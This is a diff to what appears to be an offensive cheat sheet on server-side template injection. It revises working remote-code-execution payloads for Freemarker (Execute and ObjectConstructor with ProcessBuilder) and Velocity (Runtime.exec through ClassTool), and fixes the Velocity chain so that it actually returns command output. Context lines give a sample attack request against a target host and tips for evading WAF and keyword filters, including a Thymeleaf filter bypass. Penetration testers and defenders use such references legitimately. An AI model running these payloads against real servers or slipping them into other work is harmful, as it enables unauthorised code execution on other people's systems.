@@ -203,7 +203,9 @@ GET /page?input=%3C%23assign+cmd%3D%22freemarker.template.utility.Execute%22%3Fn
 Host: target.example.com
 ```
 
-ObjectConstructor for ProcessBuilder:
+ObjectConstructor for ProcessBuilder, when the class resolver and object wrapper
+permit it. Both helpers require `?new` permission; see the resolver restrictions
+in [§6.6](#66-engine-specific-bypass).
 
 ```html
 <#assign obj = "freemarker.template.utility.ObjectConstructor"?new()>
@@ -213,13 +215,20 @@ ObjectConstructor for ProcessBuilder:
 
 ### 4.2 Velocity -- Runtime.exec
 
+Requires an exposed ClassTool and permissive introspection. Constructor lookup
+must use the declared `java.io.InputStream` parameter type, not the concrete
+process-stream subclass returned by `getClass()`.
+
 ```java
 #set($runtime = $class.inspect("java.lang.Runtime").type.getRuntime())
 #set($process = $runtime.exec("id"))
 #set($s = $class.inspect("java.util.Scanner").type)
-#set($sc = $s.getDeclaredConstructor($process.getInputStream().getClass()).newInstance($process.getInputStream()))
-$sc.useDelimiter("\\A").next()
+#set($inputType = $class.inspect("java.io.InputStream").type)
+#set($sc = $s.getConstructor($inputType).newInstance($process.getInputStream()))
+$sc.useDelimiter("\A").next()
 ```
+
+See Java's [constructor lookup contract](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/Class.html#getConstructor(java.lang.Class...)).
 
 ### 4.3 Pebble -- Reflection Chain
 
@@ -414,12 +423,11 @@ Newline injection:       {{\n7*7\n}} (WAFs may not match cross-line patterns)
 
 ### 6.6 Engine-Specific Bypass
 
-Freemarker -- when `?new()` is restricted, use ObjectConstructor:
-
-```html
-<#assign obj = "freemarker.template.utility.ObjectConstructor"?new()>
-<#assign pb = obj("java.lang.ProcessBuilder", ["sh","-c","id"])>
-```
+Freemarker -- inspect the configured resolver and the objects exposed to the
+template. `ObjectConstructor?new()` still uses the restricted built-in and is
+not a fallback for a disabled `?new`. `SAFER_RESOLVER` blocks both `Execute`
+and `ObjectConstructor`; `ALLOWS_NOTHING_RESOLVER` blocks all classes. See
+[TemplateClassResolver](https://freemarker.apache.org/docs/api/freemarker/core/TemplateClassResolver.html).
 
 Thymeleaf -- build strings from `T(Character).toString()` calls to avoid keyword filters.
 
